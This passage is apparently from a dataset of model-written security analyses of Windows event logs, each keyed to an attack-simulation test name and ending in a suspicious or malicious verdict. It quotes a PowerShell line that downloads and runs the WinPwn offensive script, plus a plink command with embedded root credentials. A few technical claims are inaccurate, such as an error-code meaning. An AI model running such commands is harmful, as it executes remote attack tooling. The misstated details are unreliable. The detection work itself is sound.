- Consider isolating `Server002` from the network temporarily while a comprehensive investigation is conducted to protect sensitive CEO-targeted systems."
Enumerate Windows Security Log via WevtUtil,"Let's examine the provided logs for any signs of suspicious or anomalous behavior:

1. **Time Change Events (Security and System Logs):**
   - Event ID 4616 in the Security log indicates the time was adjusted on the system. The process responsible, `svchost.exe`, is a legitimate Windows system process, but unauthorized time changes could suggest tampering. However, given this scenario is isolated, it may not be initially suspicious without additional context or accompanying unauthorized activity.

2. **Privileged Logons (Security Log):**
   - Event ID 4672 indicates that the user `admin_test` was granted a set of high-level privileges, including `SeDebugPrivilege`, often associated with debugging programs and can be used to manipulate system processes. This user appears to have performed several logon events (Event ID 4624). Given the context of this being on the CEO's machine, this could potentially be an insider threat scenario or credential misuse.

3. **Command Line and Process Activity (Sysmon Log):**
   - Multiple instances of `wevtutil.exe` and `cmd.exe` are executed by `SERVER002\admin_test`. The execution of `cmd.exe` with the `/c wevtutil enum-logs` command implies listing all event logs, which may suggest an attempt to gather information on the system's activities or cover tracks.
   - High integrity levels for processes like `cmd.exe` and `wevtutil.exe` indicate admin-level executions, which aligns with the privileges mentioned earlier.

4. **Application Activity:**
   - Several entries related to `MicrosoftEdgeUpdate.exe` suggest regular operations related to Microsoft Edge updates. This appears to be benign.
   
5. **Unusual Patterns or Indications:**
   - While some processes are suspicious standalone, combining time adjustments, administrative-level activities, and command executions hints at potential misuse or preparation for unauthorized actions.

### Assessment:
Based on the combination of time adjustments, privileged operations, and potential information gathering via command-line operations by a user with administrative privileges on a high-profile account, these activities collectively lean towards being suspicious.

### Conclusion:
**Resolution: SUSPICIOUS** - While no unequivocal malicious actions were found, the level of access and types of activity observed are atypical for regular administrative tasks on a high-profile executive's system. Further investigation is required, focusing on access logs, user activity, and any potential data exfiltration attempts. Also, validate the `admin_test` user activities and scrutinize any deviations from standard operating procedures or expected behavior."
Enumerate domain computers within Active Directory using DirectorySearcher,"Upon reviewing the provided event logs from various Windows event channels (System, Application, Security, PowerShell, and Sysmon), here's the detailed analysis:

### System Log

- The System log mainly includes entries related to Windows Update operations and Defender Antivirus updates, marked by Event IDs 43, 44, and 19. The updates appear routine and legitimate.

### Application Log

- The Application log identifies Windows Defender as being active (SECURITY_PRODUCT_STATE_ON). This is a benign event indicating the active state of the antivirus software.

### Security Log

- **Event ID 5379:** These are credential validation events for Microsoft accounts and Windows Live IDs. The events log unsuccessful credential validation attempts (ReturnCode: 3221226021). This could indicate that an application is attempting to use credentials but is failing. 
- **Event ID 4624 & 4672:** These suggest logon attempts or successful logons to the system with special privilege assignments. The logs pertain to the SYSTEM context, indicating automated or service-based access that's typical for Windows services.

### Windows PowerShell Log

- PowerShell activity reflects the execution of a script that appears to try fetching a list of computers using the `DirectorySearcher`. While this script is not obviously benign or malicious based solely on its function, usage by a non-standard admin user (""admin_test"") might warrant further scrutiny if unexpected in your organization.

### Sysmon Log

- **Sysmon Events (Processes and Image Loads):** 
  - Normal processes such as `powershell.exe`, `whoami.exe`, `wevtutil.exe`, `hostname.exe`, and `EdgeUpdate` related executables are seen, mostly being initiated by the `admin_test` user. The specific PowerShell command confirms what's observed in the PowerShell event log.
  - Noteworthy is the execution of tools like `whoami.exe` and `hostname.exe` by the `admin_test` account, which could typically be associated with reconnaissance activities if executed by an unexpected user.
  
- **`wevtutil.exe` Activity:** Frequent use of `wevtutil.exe` is noted; it could be legitimate (e.g., for event log administration) but can be leveraged to clear event logs in case of malicious intent.
  
- **Microsoft Edge Updates:** These reflect a regular update process, initiated by system processes, indicating normal system upkeep.

### Assessment

The activity within the logs, while containing some elements that warrant questioning (e.g., failed credential attempts, PowerShell scripts for directory searching), largely corresponds with legitimate system maintenance and update operations (Windows updates, Defender updates, system integrity checks using telemetry).

The use of `whoami.exe` and other executables by `admin_test`, as well as unsuccessful credential attempts, are of interest but not conclusive of malicious activity at the moment. The logs do not show evidence of direct compromise (e.g., no suspicious file drops, service creation, or privilege escalations beyond normal operations).

### Conclusion

Based on the evidence in the logs, the activities observed can overall be categorized as **SUSPICIOUS**. The failed credential validation and use of certain utilities by a non-typical administrator warrant further investigation to verify the legitimacy of the `admin_test` user activities and ensure no misconfigured or unauthorized access attempts are occurring.

### Guidance

1. **Investigate the `admin_test` Account:** Confirm with IT or HR if `admin_test` is a legitimate user or if recent changes could explain this behavior.
2. **Review Credential Attempts:** Verify any applications or services that might use the credentials logged in the failure codes.
3. **Monitor for Recurrence:** Implement alerts to monitor for recurrence of specific activity that matches this pattern on the CEO's machine.
4. **Check Configuration and Security Posture:** Ensure all updates and security measures are fully implemented and that no recent changes could expose vulnerabilities."
Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope,"### Analysis

After carefully reviewing the logs provided, several observations and evaluations are necessary:

#### Sysmon Logs
1. **Process Creation Events (EventID 5 and EventID 1)**
   - There are several instances of processes such as `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, and `powershell.exe` run by the user `SERVER002\admin_test`.
   - **wevtutil.exe** is frequently used for enumerating and managing Windows event logs. While it can be used legitimately, repeated usage might suggest log tampering or information gathering.
   - **powershell.exe** is invoked with a command that fetches Active Directory computer objects (`Get-adcomputer` command). This is often used in administrative scripts but can also be indicative of reconnaissance in an attack scenario.
   - **conhost.exe**, **hostname.exe**, and **whoami.exe** seem to accompany other processes in expected roles as part of normal interactive or system processes.

2. **Process Argument**
   - The `powershell.exe` process is running a command to execute an Active Directory query. This could signal a legitimate administrative task or potential reconnaissance activity if unexpected on this machine.

#### Security Logs
- There are audits concerning time changes by `svchost.exe` using the LOCAL SERVICE account, which appears routine and linked to time synchronization (Event ID 4616).

#### Application and System Logs
- Standard and expected logs, including Microsoft Edge updates and time service events, are executed by SYSTEM or NETWORK SERVICE accounts, suggesting normal background processes.

#### Windows PowerShell Logs
- Correspond to the PowerShell execution observed in Sysmon logs, indicating the execution of commands related to querying Active Directory.

### Assessment

- **Anomalies**:
  - Frequent execution of `wevtutil.exe` and the PowerShell command querying Active Directory stand out as activities that warrant further investigation.
  - Such commands could be part of legitimate administrative tasks but raise red flags when performed repeatedly or unexpectedly.

- **Potential Indicators of Malicious Activity**:
  - Usage of `powershell.exe` for directory services queries can signify lateral movement or credential gathering if not part of routine administrative operations.
  - Repeated use of `wevtutil.exe` could suggest efforts to modify or access event logs covertly.

### Threats and Risks Identified
- Possible reconnaissance activity leveraging PowerShell.
- Potential manipulation or investigation of system event logs through `wevtutil.exe`.

### Guidance 

- Validate the necessity and purpose of Active Directory queries and repeated `wevtutil.exe` executions with the user `admin_test`.

- Consider enhancing monitoring rules for suspicious PowerShell activity and log file access/manipulation.

### Resolution

**SUSPICIOUS**

The activity noted contains elements that typically do not appear in usual workflows and demands further investigation to determine the legitimacy and necessity in context, pending which a resolution should be appropriately determined."
Enumerate all accounts (Domain),"Based on the provided Windows event logs, let's analyze the activities and determine the nature of the events:

### Notable Observations

1. **Whoami and HOSTNAME Executions:**
   - There are multiple instances of `whoami.exe` and `hostname.exe` being executed. `whoami` is often used to check the current logged-on user’s information, and `hostname` reveals the computer's name. These commands, while legitimate, can be used by malicious actors to gain information about the system from a command line or script. However, their standalone executions don't necessarily indicate malicious activity unless correlated with suspicious contexts.

2. **Cmd.exe Execution:**
   - There is execution of `cmd.exe` with command-line arguments for `net user /domain` and `net group /domain`. This is used to enumerate user accounts and groups on a domain, which might be suspicious, especially if conducted on a CEO's machine or without prior authorization. This behavior could indicate reconnaissance activity.

3. **Preparation for Microsoft Edge Installation:**
   - Numerous entries relate to the execution of Microsoft Edge Update (`MicrosoftEdgeUpdate.exe`) and Installer (`setup.exe`). These processes are expected during software updates, especially when triggered by `NT AUTHORITY\SYSTEM`. This appears to be a legitimate software update activity.

### Suspicious Activity

- **Reconnaissance Commands:**
  - The use of `cmd.exe` to run `net user` and `net group` commands without context could suggest that someone is collecting details about user accounts and group memberships, which is common in lateral movement or privilege escalation attempts.

### Risk Assessment

- **Execution by Admin User:**
  - The mentioned processes execute under the `SERVER002\admin_test` account with high integrity levels. This local admin access is normal, but careful review is needed to confirm these actions are part of an authorized task or process.

### Conclusion and Resolution

After considering all the information and activities captured within the logs:

- **Resolution:** **SUSPICIOUS**

Given the use of network-related commands to gather domain information and the context of being on the CEO's machine, the event activities are suspicious. There is no direct indication of malware or compromise, but the reconnaissance-like action highlights potential for further investigation to ensure no unauthorized access or exploitation attempts.

### Recommendations

- **Verify Authorized Activity:**
  - Confirm with IT or management if these activities were expected and authorized. This can be part of routine checks or troubleshooting.

- **Monitor Account and System:**
  - Continue monitoring the `admin_test` account and the CEO's machine for further suspicious activities or unexpected accesses.

- **Perform a Security Audit:**
  - Conduct a security audit to review configurations, permissions, and recent changes or activity related to the CEO’s machine.

- **Review Security Controls:**
  - Ensure all security controls are updated and functioning correctly, including endpoint detection and response (EDR) solutions and logging mechanisms."
WinPwn - fruit,"Upon analysis of the provided logs, several observations stand out, particularly in the PowerShell and Sysmon logs, which suggest potential malicious activity:

1. **PowerShell Log Analysis**:
   - The `powershell.exe` is being executed with a command line that includes downloading and executing a script from a GitHub URL belonging to the user ""S3cur3Th1sSh1t"". The script being downloaded is `WinPwn.ps1`. This is highly indicative of potential malicious activity as it is a common technique used by attackers to download and execute scripts from the internet on compromised machines. The use of `iex (new-object net.webclient).downloadstring()` is known for executing the string as PowerShell code, which can bypass security measures designed to prevent direct script execution.

2. **Sysmon Log Analysis**:
   - Multiple logs indicate the use of administrative tools like `wevtutil.exe` and `conhost.exe` by the user ""admin_test"". While these processes might be legitimate, in the context of the PowerShell activity, they could potentially signal attempts to cover tracks or facilitate privilege escalation.
   - The log entries for the execution of `hostname.exe` and `whoami.exe` suggest environment reconnaissance, which is a common step in a lateral movement or privilege escalation attack scenario.
   - The PowerShell process initiated matched the same malicious script execution pattern as seen in the PowerShell logs, further confirming suspicion.

3. **Security Log Analysis**:
   - The user ""admin_test"" obtains privileges associated with high-level administrative tasks (`SeDebugPrivilege`, `SeLoadDriverPrivilege`, etc.), required for actions like installing drivers, modifying system security, and potentially bypassing security permissions. Combining these events with the suspicious PowerShell activity raises red flags for privilege escalation attempts.

Overall, the execution of a PowerShell script from an external source coupled with the elevated privileges and the use of reconnaissance commands paint a picture aligned with malicious activities such as data exfiltration or lateral movement within the network.

**Threat & Risk Assessment**:
- The activities identified present significant risks, including the potential for unauthorized access to sensitive data, lateral movement within the network, and further exploitation of the system.

**Resolution**:
- **MALICIOUS**: The logs contain evidence of malicious activity, particularly the execution of a remote PowerShell script, which is known for its use in executing malicious codes and potentially compromising the system.

**Guidance on How to Proceed**:
1. Immediately isolate the affected machine to prevent any further lateral movement or data exfiltration.
2. Conduct a full forensic investigation to understand the full extent of the breach, including identifying any other compromised accounts or systems.
3. Reset credentials for any affected users, especially those with administrative privileges.
4. Review and enhance endpoint protection policies to block such script execution in the future.
5. Consider conducting a full network review and penetration test to identify and close any other potential vulnerabilities.
6. Report and document the incident in accordance with your company’s incident response plan, and potentially involve law enforcement if sensitive data has been compromised."
System Owner-User Discovery Using Command Prompt,"Upon analyzing the provided Windows event logs, here is the summary of findings and the assessment:

### System Logs
- The logs reveal updates for Microsoft Defender Antivirus with Security Intelligence Update KB2267602, indicating that antivirus signatures were successfully updated at 12:46:06. There is nothing suspicious about these logs, and they reflect normal update activity for antivirus software.

### Security Logs
- The repeated EventID 5379 entries indicate credential verification attempts. The attempts show a return code of `3221226021`, which corresponds to ""The specified user does not exist"" (STATUS_NO_SUCH_USER). These attempts are related to a MicrosoftAccount user ""02txoixylodcstop"", and the error is consistent across multiple entries. This situation could be benign if it results from a misconfiguration or stale credentials, but repeated failed authentication attempts can also be suspicious if not accounted for.

### Sysmon Logs
- There are multiple instances of process creation events (`EventID 5` and `EventID 1`) involving standard Windows utilities like `wevtutil.exe`, `conhost.exe`, `hostname.exe`, `whoami.exe`, `cmd.exe`, `net.exe`, and `wuauclt.exe`.
- `cmd.exe` is used to execute a sequence of commands that involve user enumeration via `net users` and querying session information. This behavior could indicate reconnaissance or privilege evaluation activities, which are common in initial stages of compromise.
- The use of `wevtutil.exe` to query event logs may be routine; however, combined with other suspicious activities might indicate a compromise.
- The processes are executed by the user `SERVER002\admin_test`, with high integrity levels, which could suggest administrative privileges.

### Application Logs
- The application logs report that Windows Defender is active (SECURITY_PRODUCT_STATE_ON), which is a positive sign for security posture.

### Assessment
- **Suspicious Activity Detected**: The sequence of actions involving command execution (`cmd.exe`), user enumeration (`net users`), and system information gathering (`whoami.exe`) coupled with failed credential checks (Security log) suggest activities that could be indicative of reconnaissance or preparation for further intrusion steps.

### Recommendation
Given the nature of detected activities, although there aren't clear indications of active compromise, the behavior suggests potential probing which requires further investigation. The following steps are recommended:
1. Verify the legitimacy of the user `SERVER002\admin_test` and its activities between the given timestamps.
2. Cross-check any external connections or unusual network activity around these times.
3. Explore the context for failed credential attempts to ascertain if they are legitimate or a bruteforce attack.
4. Monitor for any further suspicious process executions or network activity.
5. Consider isolating the machine until further validation of the events can assure it's secure.

### Conclusion
The resolution for the provided logs is **SUSPICIOUS**, as the activities in the logs warrant further investigation before making a definitive judgment of being benign or malicious."
List Open Egress Ports,"After a thorough analysis of the provided logs, several elements stand out as potential indicators of suspicious activity on the Windows host ""Server002.""

### Key Insights:

#### 1. **PowerShell Activity:**
   - The logs show multiple instances of PowerShell being executed with the script hosted in `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\top-128.txt`. The script appears to be performing a network scan by initializing a TCP connection to a host named ""allports.exposed"" for various ports and logs the results in a file on the user's desktop.
   - The script's objective to check open ports across a potentially malicious domain (""allports.exposed"") suggests reconnaissance activity, which is often a precursor to more intrusive actions such as data exfiltration or lateral movement.

#### 2. **Sysmon Logs:**
   - The Sysmon logs corroborate the PowerShell activity by logging the execution of `powershell.exe` and its child processes such as `conhost.exe` and processes like `HOSTNAME.EXE`, `conhost.exe`, and `whoami.exe`, indicating command and administrator-level queries.
   - The frequent spawning of PowerShell processes, especially with scripts involving actions like port scanning listed above, is anomalous and could be indicative of an unauthorized action on the system.

#### 3. **Process Execution and User Context:**
   - Many of these operations are executed under the `SERVER002\admin_test` user context, which implies possible administrative access. If this user account is not typically engaged in such network queries or if it is a generic or infrequently used administrative account, that could indicate an unauthorized user leveraging administrative privileges.

### Assessment:

Given the analysis of the PowerShell and Sysmon logs, there is a clear deviation from typical benign activity commonly observed in a secure environment. The actions captured demonstrate behavior consistent with network reconnaissance and administrative command execution typically aligned with malicious intent.

### Resolution:

- **Resolution: SUSPICIOUS**

### Guidance for Further Action:

1. **Immediate Investigation:** Initiate a deeper investigation to verify the intent and origin of the PowerShell and other command executions. Check for any unauthorized access to the `admin_test` account.
   
2. **User Verification:** Verify the legitimacy and recent activity of the `admin_test` account to ascertain if these actions were indeed authorized by a legitimate user or if the account has been compromised.

3. **Network Monitoring:** Increase monitoring on network traffic from and to ""allports.exposed"" or associated IP addresses. Review firewall and IDS/IPS logs for irregular patterns.

4. **System Integrity:** Conduct a thorough system integrity check of ""Server002"" for any signs of tampering, malware infection, or unauthorized scripts.

5. **Containment:** If verified as unauthorized, contain the user's access immediately and check for potential lateral movement to other critical systems within the network.

By following the above points, you can determine the seriousness of the potential breach and take appropriate measures to secure your network."
ESXi - Darkside system information discovery,"Upon analyzing the provided Windows event logs, several activities stand out that may indicate suspicious behavior or potential malicious activities:

1. **Execution of PowerShell and WEVTUTIL:**
   - Multiple instances of `powershell.exe` and `wevtutil.exe` are executed by the user `SERVER002\admin_test`. These utilities are often used in scripts and can perform administrative tasks, making them popular in legitimate as well as malicious scenarios. The absence of specific command lines makes it challenging to ascertain malicious intent purely based on the process execution without further context.

2. **Execution of Plink and Commands via CMD:**
   - The execution of `cmd.exe` with the command line involving `plink.exe`, an SSH client, to connect to a remote server and execute a script (`esx_darkside_discovery.txt`) is somewhat suspicious:
     ```plaintext
     ""cmd.exe"" /c echo """" | ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\..\Externalfiles\plink.exe"" ""file.local"" -ssh -l ""root"" -pw ""pass"" -m ""C:\Users\ADMIN_~1\AppData\Local\Temp\file\data\src\esx_darkside_discovery.txt""
     ```
   - The script execution through Plink and its placement in a temporary directory along with a hardcoded password suggests potential malicious activity or testing. It is unusual to have credentials embedded in such a manner unless absolutely necessary, indicating possible compromise or backdoor attempts.

3. **Various Service and Update Executions:**
   - Several processes around Microsoft Edge Update and typical Windows service operations (`svchost.exe`, `DeviceCensus.exe`, `wsqmcons.exe`) appear benign and align with regular OS activities, especially since they are executed under `NT AUTHORITY\SYSTEM`.

4. **Account Activity:**
   - The event logs show exploration and enumeration of user accounts like `Administrator`, `admin_test`, `Guest`, etc., which could be suspect if not part of normal operations.
   
5. **System Integrity Level and Execution Context:**
   - Many processes operate with high integrity levels, indicating privileged execution, which is necessary for certain tasks but also a target for privilege escalation in compromise scenarios. 

In conclusion, while numerous activities in the logs may appear benign or typical for a Windows server, the pattern involving `powershell.exe`, `wevtutil.exe`, and notably `cmd.exe` piping to `plink.exe` with embedded credentials is highly concerning. This suggests unauthorized remote connections and script execution.

### Assessment: SUSPICIOUS

**Guidance:**
- Investigate the origin and purpose of scripts and commands executed, especially those involving `plink.exe`.
- Review system and network logs around the time these commands were executed for additional context.
- Verify user activity for `admin_test` and ensure their credentials and role are legitimate.
- Consider collecting more detailed command-line execution logs and auditing privileged account usage.

Given the uncertainty around the intent without additional context and the potential for further malicious activity, it is recommended that a deeper investigation into these events is performed to ensure no threat persists or escalates."
PowerShell Network Sniffing,"After reviewing the provided event logs, here is the detailed analysis:

### Key Observations:
1. **Sysmon Logs:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` executed by `SERVER002\admin_test`. Both these executables being run may not inherently suggest malicious activity as they can be used for legitimate administrative tasks.
   - `powershell.exe` run with a complex command for network session and event capture. This activity could be suspicious as PowerShell is often used in attack frameworks for script-based exploitation, but it can also be used for legitimate purposes by administrators.

2. **Execution of 'HOSTNAME.EXE' and 'whoami.exe':**
   - Both these commands are benign and often used for system and user reconnaissance.
   - These programs being executed might indicate either a normal user credential verification or could be a sequence in a larger malicious recon activity.

3. **Security Logs:**
   - Event ID 4624 (Logon) with NTLM authentication is noted for 'admin_test'. Frequent logons with NTLM could suggest a point for further investigation, especially if it wasn’t expected.
   - Event ID 4672 mentions special privileges being assigned to `admin_test`, which often occurs during normal administrative tasks but warrants a check to confirm that it aligns with expected user behavior.

4. **PowerShell Logs:**
   - PowerShell commands involving network capture session creation and termination. While these can be used legitimately, when used by non-administrative users or without documented necessity, it might be indicative of network reconnaissance or data exfiltration attempts.

5. **System Time Changes:**
   - Numerous system events indicating time changes; showing time adjustments with time source ""time.windows.com"". This could lead to investigation to see if this was a result of network time misconfiguration or intentional tampering.

### Assessment:
The logs exhibit behaviors that could be potentially suspicious:
- The frequent executions of `wevtutil.exe` and `conhost.exe` by `admin_test`, while common for administrators, should be verified against expected usage patterns.
- The use of PowerShell to initiate a ""sniffer"" indicates a higher likelihood of either legitimate actions or potential misuse.

### Conclusion:
- **Resolution: SUSPICIOUS**
  - While none of the actions observed are definitively malicious, they diverge from normal usage patterns and could be a precursor to or part of a more extensive attack.
  - Further investigation is required to understand the context in which these activities were performed, especially concerning the PowerShell command usage and NTLM authentication activities.

### Recommendations:
1. **User Activity Review:**
   - Verify with `admin_test` or security logs the purpose behind the use of tools like PowerShell for network sessions. Collaborative confirmation would validate the intent.

2. **Network Monitoring:**
   - Setup alerts for unusual or unauthorized usage patterns involving network capture via PowerShell.

3. **Endpoint Review:**
   - Conduct a more comprehensive analysis on the host in question, with particular attention to services and tasks scheduled and other logs not included here.

4. **Security Policy Review:**
   - Ensure strict usage policies regarding administrative access, logging, and authentication methods such as NTLM to detect unsanctioned activities.

By following these steps, further insights can be gained to confirm if these activities are part of benign administration or part of a security threat."
Find and Display Internet Explorer Browser Version,"Upon reviewing the provided Windows event logs, here's a detailed analysis of the logs and any suspicious behavior:

### Analysis and Findings:

1. **Frequent Execution of Common Utilities**:
   - There are frequent executions of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test`. These commands are common for accessing and managing event logs and are typically benign unless they are executed in an unusual pattern, such as repeatedly or at anomalous times without explicit user actions or purposes. However, in isolation and without additional context, these do not necessarily indicate malicious activity.

2. **Process Execution Context**:
   - `wevtutil.exe` and `conhost.exe` generally appearing in the logs do not show any unusual command-line arguments or abnormal parent-child relationships. The processes appear to be executed under the admin_test account with high integrity, which could be normal for an administrative task.

3. **Commands and Registry Queries**:
   - The execution of `cmd.exe` running a registry query (`reg.exe`) is noted. The command line - `cmd.exe /c reg query ""HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer"" /v svcVersion` indicates that the version of Internet Explorer is being queried. Querying registry keys might be normal in a system's health check or troubleshooting, but continuous and unsolicited querying could be suspicious.

4. **Integrity Level**:
   - All events that involved cmd.exe and whoami.exe were running with high integrity level. This indicates privileges appropriate for an administrative user performing legitimate tasks on the system.

5. **Time Synchronization**:
   - The system logs indicate changing of system time, which is controlled by svchost.exe. Time adjustments can be a normal administrative task, possibly related to daylight saving time changes or synchronization with time.windows.com. However, malicious actors may manipulate system time to inhibit logging or forensic examination.

6. **Absence of Script Execution or PowerShell Activity**:
   - The logs explicitly mention that there are no PowerShell logs, which means there are no records of script execution using PowerShell at least in the logs provided. This could impact the analysis as PowerShell is often used for both administrative purposes and by attackers.

7. **Security Log Entries**:
   - The security logs registered the time changes as events made by the LOCAL SERVICE using `svchost.exe`, aligning with the system logs. This doesn't immediately point to a compromise but should be flagged for further correlation with user activities around that time.

### Assessment:

- **SUSPICIOUS** - The activities logged, such as repeated querying of event logs and registry entries, are common in both administrative tasks and the initial phases of malicious activity. The actions observed do not offer definitive proof of malicious intent. They warrant further investigation to exclude benign administrative tasks, especially if this system is under heightened scrutiny being the CEO's machine.

### Recommended Next Steps:

1. **Further Investigation**:
   - Review logs for surrounding times to identify any anomalous logins, unauthorized access events, or changes made by the `admin_test` account.
   - Investigate if these registry queries were part of a legitimate software's operation, IT task, or unauthorized script.

2. **User Verification**:
   - Verify the sessions and actions performed by `SERVER002\\admin_test` with the actual activities performed by the owner of the account.

3. **Network Monitoring**:
   - Monitor network traffic for any unusual outbound connections that may indicate the initiation of unauthorized communications.

4. **Endpoint Monitoring**:
   - Ensure that EDR solutions are configured to flag and alert on similar actions, especially if they originate from high-profile user accounts like the CEO's.

By following these steps, you will be able to determine if these activities are part of a benign administrative task set or something that may require deeper forensic analysis."
System Time with Windows time Command,"Upon analyzing the provided logs across different channels (Security, System, Sysmon, Application), the following observations are made which might indicate anomalous or suspicious behavior:

1. **Privileges and Time Sync Events (Security Log)**
   - Event ID 4672 indicates special privileges granted to the user `admin_test`. The privileges include `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, and others that are significant in system administration and potentially harmful if misused.
   - Event ID 4616s show time changes on the system which is normal when syncing with an NTP server, but it could also point towards attempts to manipulate time for evading detection or logs manipulation.

2. **Frequent Execution of `wevtutil.exe` and `cmd.exe` (Sysmon Log)**
   - Instances of executing `C:\Windows\System32\wevtutil.exe` by `admin_test` can be seen, which might suggest attempts to read or clear Windows event logs.
   - The execution of `cmd.exe` with `/c time` under high integrity level. This command changes the system time which corroborates the time changes observed in Event ID 4616.

3. **Multiple Instances of Microsoft Edge Update Processes (Sysmon Log)**
   - Numerous logs show the execution of Microsoft Edge Update related executables, which can be a normal updating routine. However, the process execution frequency and involvement of temporary directories need to be checked to ensure no tampered update mechanism.

4. **NTLM Authentication Attempts (Security Log)**
   - An Event ID 4624 log shows a successful network logon from a workstation `DESKTOP-3HL5B2P` using NTLM, which could potentially indicate lateral movement attempts or unauthorized access if such activity is not expected from that machine or user.

**Conclusion and Recommendation:**
- **Resolution**: **SUSPICIOUS**
- **Assessment**:
  - There's evidence suggestive of potentially illicit actions: the usage of powerful privileges, unusual log and time manipulations, and noteworthy authentication attempts over NTLM.
  - Although not definitively malicious in this context alone, the actions warrant closer scrutiny or correlation with other indicators to rule out misuse or compromise.
  
- **Next Steps**:
  - Validate the intent behind granting high-level privileges and monitor `admin_test` activities closely.
  - Verify whether the time change activities and frequent execution of logging utilities align with company policies or procedures.
  - Investigate the authentication log and network traffic to scrutinize the access patterns of the involved `DESKTOP-3HL5B2P` machine.
  - Further logs and possibly forensic examinations should be conducted to ensure no unauthorized software executions are happening that might exploit the privilege levels or authenticated sessions. 
  
Finally, it is essential to cross-check with network security tools and correlate these events to ensure a comprehensive investigation."
Network Share Discovery via dir command,"Upon reviewing the provided logs, let's analyze the activities to identify any suspicious or malicious behavior:

### Anomalous Behavior:

1. **Repeated Execution of Edge Update Processes**:
   The logs show multiple instances of `MicrosoftEdgeUpdate.exe` and related components (`MicrosoftEdgeUpdateComRegisterShell64.exe`) running within a short time frame. This could suggest either a legitimate update process or a potential misuse of these processes for malicious actions (given the frequency and diversity of subprocess executions).

2. **Execution of Windows System Utilities**:
   There are a number of instances where system utilities such as `cmd.exe`, `whoami.exe`, and `hostname.exe` are executed. While the use of these utilities can be legitimate, their presence often warrants further investigation, especially if they are executed frequently or by unexpected users.

3. **Command Prompt (cmd.exe) Activity**:
   A suspicious command execution is observed: `""cmd.exe"" /c dir \\127.0.0.1\c$ & dir \\127.0.0.1\admin$ & dir \\127.0.0.1\IPC$`. This command lists the hidden administrative shares on the local machine, which could indicate exploration activity typically associated with unauthorized access attempts or privilege escalation efforts.

4. **Process Integrity and Execution Context**:
   Many of the processes are executed with a high or system integrity level, which means they have elevated permissions, potentially allowing them to make significant system changes. 

5. **Wevtutil Executions**:
   There are multiple runs of `wevtutil.exe`, which is often used to manage event logs. This can be suspicious in the context of an attack, such as when a threat actor attempts to clear or export logs to cover their tracks.

### Assessment of the Situation:

The logs suggest the presence of suspicious activities. The frequent and varied execution of Microsoft Edge update processes, coupled with the execution of a directory listing on administrative shares through `cmd.exe`, is atypical and could indicate potential compromise or testing of a foothold in the system.

### Identified Threats/Risks:

- **Potential Misuse of Edge Update Processes**: There is a risk that these processes might be exploited for malicious purposes, masking under legitimate software updates.
- **Unauthorized System Reconnaissance**: Command-line executions suggesting potential reconnaissance or lateral movement attempts.
- **Log Manipulation Attempts**: Frequent `wevtutil` executions could signal efforts to tamper with event logs.

### Guidance on How to Proceed:

1. **Conduct an In-Depth Review**: Investigate the contexts and command lines associated with the triggering of `cmd.exe`, `wevtutil.exe`, and other system utilities.
2. **Verify Edge Update Processes**: Confirm if the edge update executions are expected and align with known software update schedules or configurations.
3. **Check for Indicators of Lateral Movement**: Review network traffic for connections to/from this machine and assess any evidence of lateral movement attempts.
4. **Review System and Security Logs**: For completeness, corroborate suspicious actions across other event logs that might not have been provided here.

### Resolution:

Based on the above analysis and the evidence of potential abnormal activities:

**Resolution: SUSPICIOUS**

The activity observed requires further investigation to determine if an actual compromise has occurred."
WinPwn - shareenumeration,"Upon reviewing the provided logs, several elements stand out that warrant close scrutiny:

### Suspicious Activity Analysis:
1. **PowerShell Scripts**:
   - The Windows PowerShell logs show instances where a script is being downloaded and executed from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/`). Specifically, the script `WinPwn.ps1` is being fetched and executed via PowerShell:
     - `powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1')}`
   - This is highly suspicious as this activity is indicative of potential exploitation or reconnaissance attempts on the network. Using PowerShell to execute scripts from the internet is a common tactic used by threat actors.

2. **System Command Executions**:
   - The Sysmon logs reflect multiple process executions such as `whoami.exe`, `conhost.exe`, and `wevtutil.exe` being run under the context of `SERVER002\admin_test`. Although these utilities are legitimate, they are commonly used in post-exploitation activities to enumerate user privileges (`whoami`) and manage logs (`wevtutil`).
   - The running of these commands in close succession, especially with a critical administrative context, is often indicative of lateral movement attempts or preparatory steps for privilege escalation.

3. **Kernel and Security Logs**:
   - The adjustment of system time noted in the Kernel-General and Security-Auditing logs might indicate an attempt to cover tracks as part of a malicious activity. Adjusting system time can be a technique used to avoid time-based detection mechanisms, although it can also be a normal system administrative action.

4. **Edge Update Processes**:
   - While the execution of Microsoft Edge Update processes is generally benign, the fact that these updates are recurring so frequently within a tight timeframe should correspond with legitimate update cycles and internet availability checks.

### Assessment & Conclusion:
Given the suspicious PowerShell activity involving downloading and executing a script from an external source, combined with the suspicious use of system tools (`whoami`, `wevtutil`), it appears the system may have been subjected to unauthorized or malicious activity.

### Risks and Recommendations:
- There is a **high risk** of malicious activity due to suspicious script execution from a potentially malicious source.
- Immediate isolation of this host for deeper forensic analysis is recommended to prevent further potential malicious activity.
- Reviewing the enterprise network for similar activities correlating with the same timestamps to ascertain if this is an isolated incident or part of broader malicious activity is suggested.

### Resolution:
- **MALICIOUS**: The observed activity involving unauthorized script execution and behavior typical of cyber intrusion necessitates immediate attention and response."
Enumerate Users Not Requiring Pre Auth (ASRepRoast),"Upon analyzing the given Windows event logs, several points of interest arise related to potential indicators of suspicious or malicious activities:

1. **PowerShell Execution**:
   - Multiple instances of PowerShell are executed by the user `SERVER002\\admin_test`. One of these instances runs a command to search for Active Directory users (`get-aduser`) with a specific attribute (`DoesNotRequirePreAuth`). This type of command could potentially be used for reconnaissance purposes within a network, attempting to locate accounts that may be vulnerable to brute force attacks without enrolling in protection mechanisms like Kerberos pre-authentication.

2. **Frequent Execution of `wevtutil.exe` and `conhost.exe`**:
   - Logs show frequent execution of the `wevtutil.exe` command-line utility, which is used for managing event logs. This utility is run several times consecutively, potentially to export event logs. Such actions might indicate log tampering or data exfiltration attempts as part of invasion cover-up actions.
